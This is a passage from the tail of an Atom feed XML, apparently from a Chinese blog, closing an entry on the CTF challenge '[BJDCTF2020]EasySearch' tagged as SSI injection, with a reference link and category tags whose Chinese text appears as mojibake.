title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSIæ³¨å…¥æ¼æ´æ€»ç»“</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BJDCTF2020-EasySearch&quot;&gt;&lt;a href=&quot;#BJDCTF2020-EasySearch&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]EasySearch&quot;&gt;&lt;/a&gt;[BJDCTF2020]EasySearch</summary>
      
    
    
    
    <category term="buuåˆ·é¢˜è®°å½•" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="SSIæ³¨å…¥" scheme="http://example.com/tags/SSI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
